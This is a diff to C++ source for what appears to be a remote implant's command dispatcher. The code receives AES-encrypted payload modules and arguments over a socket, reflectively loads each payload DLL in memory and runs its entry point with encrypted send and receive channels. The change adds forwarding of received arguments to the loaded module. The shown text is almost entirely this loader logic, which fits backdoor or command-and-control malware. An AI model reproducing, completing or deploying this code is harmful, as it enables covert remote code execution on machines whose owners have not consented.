@@ -20,6 +20,7 @@ BOOL check_connection(int bytes) {
 	return 1;
 }
 
+
 std::vector<UCHAR> geneate_random(int len) {
 	std::random_device engine;
 	std::vector<UCHAR> array;
@@ -92,6 +93,18 @@ void main_dispatcher(SOCKET client_socket) {
 				if (check_connection(recv_bytes)) {
 					std::vector<UCHAR> payload_rawdata = aes.DecryptCBC(encrypted_payload_info, aes_key, iv);
 					PPAYLOADINFO payload_info = (PPAYLOADINFO)payload_rawdata.data();
+
+					PARGUMENT arg;
+					std::vector<std::string> arglist;
+					for (int i = 0; i < payload_info->payload_argc; i++)
+					{
+						std::vector<UCHAR> encrypted_arg(256);
+						recv_bytes = recv(client_socket, (char*)encrypted_arg.data(), encrypted_arg.size(), 0);
+						std::vector<UCHAR> argument_raw = aes.DecryptCBC(encrypted_arg, aes_key, iv);
+						arg = (PARGUMENT)argument_raw.data();
+						arglist.push_back(arg->arg_data);
+					}
+
 					PPAYLOAD payload_part;
 					char* payload = new char[payload_info->payload_size];
 					int payload_size = 0;
@@ -104,7 +117,7 @@ void main_dispatcher(SOCKET client_socket) {
 						memcpy(payload + payload_size, payload_part->payload_part, payload_part->part_size);
 						payload_size += payload_part->part_size;
 					} while (payload_part->part_size != 0);
-					
+				
 					if (payload_info->payload_type == PAYLOAD_DLL)
 					{
 						LONGLONG* payload_addr = (long long*)_LoadLibrary(payload);
@@ -117,6 +130,7 @@ void main_dispatcher(SOCKET client_socket) {
 							mod_ctx.iv_key = iv;
 							mod_ctx.recv_encrypted = recv_encrypted;
 							mod_ctx.send_encrypted = send_encrypted;
+							mod_ctx.argv = arglist;
 							((void(*)(MODULE_CONTEXT))pModuleEntrypoint)(mod_ctx);
 							_UnloadLibrary(payload_addr);
 						}
@@ -131,7 +145,7 @@ void main_dispatcher(SOCKET client_socket) {
 				}
 				else
 				{
-					return;
+					break;
 				}
 			}
 			return;
